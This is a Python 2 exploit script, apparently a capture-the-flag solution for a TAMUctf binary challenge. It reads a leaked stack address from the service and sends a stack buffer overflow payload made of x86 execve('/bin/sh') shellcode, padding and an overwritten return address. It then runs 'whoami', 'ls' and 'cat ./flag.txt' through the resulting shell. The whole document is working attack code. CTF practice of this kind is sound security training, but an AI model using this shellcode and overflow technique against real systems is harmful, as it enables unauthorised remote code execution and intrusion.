#!/usr/bin/python

import sys, socket
from time import sleep


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

addr = socket.gethostbyname("pwn.tamuctf.com")
port = 4323

conn = addr,port

s.connect(conn)

out=s.recv(256)
print(out)

#Take this, you might need it on your journey 0xffa24b2e!

addr = out[47:-1]
print "Found addr: " + addr
print "building exploit..."

h1="0x"+addr[0:2]
h2="0x"+addr[2:4]
h3="0x"+addr[4:6]
h4="0x"+addr[6:8]

print "addr : " + h4 + h3 + h2 + h1

shell="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
num=302-len(shell)

exploit = shell+"A"*num + chr(int(h4, 16)) + chr(int(h3, 16)) + chr(int(h2, 16)) + chr(int(h1, 16))+"\n"

print "Sending exploit..."
print exploit
s.send(exploit)

print "Serving shell..."
while(1):
    input = "whoami\n"
    s.send(input)
    out1 = s.recv(256)
    print(out1)
    sleep(1)
    input = "ls\n"
    s.send(input)
    out2 = s.recv(256)
    print(out2)
    sleep(1)
    input = "cat ./flag.txt\n"
    s.send(input)
    out3 = s.recv(256)
    print out3
    sleep(1)
    s.close()
